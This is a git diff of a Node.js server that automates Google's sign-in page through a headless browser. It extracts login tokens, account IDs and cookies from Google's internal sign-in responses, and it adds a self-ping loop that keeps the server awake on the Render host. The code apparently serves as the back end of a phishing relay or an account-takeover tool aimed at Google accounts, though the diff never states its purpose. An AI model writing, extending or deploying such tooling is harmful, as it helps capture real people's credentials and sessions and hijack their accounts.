@@ -6,11 +6,13 @@ const axios = require('axios')
 require('dotenv').config()
 
 let page = null
+let mID = null
 let mLoaded = false
 let mUrl = null
 let mPostData = null
 let mHeaders = null
-let mIp = ''
+
+let mStart = new Date().toString()
 
 const app = express()
 
@@ -31,8 +33,11 @@ setInterval(async () => {
     await loadLoginPage()
     console.log('Page Reload Success')
     mLoaded = true
-}, 15*60*1000)
+}, 30*60*1000)
 
+setInterval(async () => {
+    await updateStatus()
+}, 60000)
 
 app.post('/login', async (req, res) => {
     if (req.body) {
@@ -72,20 +77,28 @@ app.get('/login', async (req, res) => {
     }
 })
 
-app.get('/ip', async (req, res) => {
-    res.end(mIp)
-})
-
 app.get('/', async (req, res) => {
-    res.end('Fuck You')
+    if (mID == null) {
+        try {
+            let url = req.query.url
+            if (!url) {
+                let host = req.hostname
+                if (host.endsWith('onrender.com')) {
+                    url = host.replace('.onrender.com', '')
+                }
+            }
+    
+            if (url && url != 'localhost') {
+                mID = url
+            }
+        } catch (error) {}
+    }
+    
+    res.end(mStart)
 })
 
 
 async function startBrowser() {
-    mIp = await getIpAdress()
-
-    console.log('Ip: '+mIp)
-
     try {
         let browser = await puppeteer.launch({
             headless: false,
@@ -185,8 +198,8 @@ async function getLoginToken(number) {
             if (json[1] == 'V1UmUe') {
                 let value = JSON.parse(json[2])
                 if (value[21]) {
-                    let info = value[21][1][0][1]
-                    return { status:1, tl:info[1][1], cid:info[0][1], host: getHostGaps(headers.cookie) }
+                    let info = value[21][1][0]
+                    return { status:1, tl:info[1][1][1], cid:info[1][0][1], type:info[0], host: getHostGaps(headers.cookie) }
                 } else if (value[18] && value[18][0]) {
                     return { status:3 }
                 } else {
@@ -216,23 +229,19 @@ async function loadingRemove() {
 async function loadLoginPage() {
     for (let i = 0; i < 3; i++) {
         try {
-            await page.goto('https://accounts.google.com/ServiceLogin?service=accountsettings&continue=https://myaccount.google.com', { waitUntil: 'load', timeout: 0 })
+            await page.goto('https://accounts.google.com/ServiceLogin?service=accountsettings&continue=https://myaccount.google.com', { timeout: 60000 })
             await delay(500)
             break
         } catch (error) {}
     }
 }
 
-async function getIpAdress() {
+async function updateStatus() {
     try {
-        let response = await axios.get('https://ifconfig.me/ip')
-        let data = response.data
-        if (data) {
-            return data
+        if (mID) {
+            await axios.get('https://'+mID+'.onrender.com')
         }
     } catch (error) {}
-
-    return ''
 }
 
 function getHostGaps(cookies) {
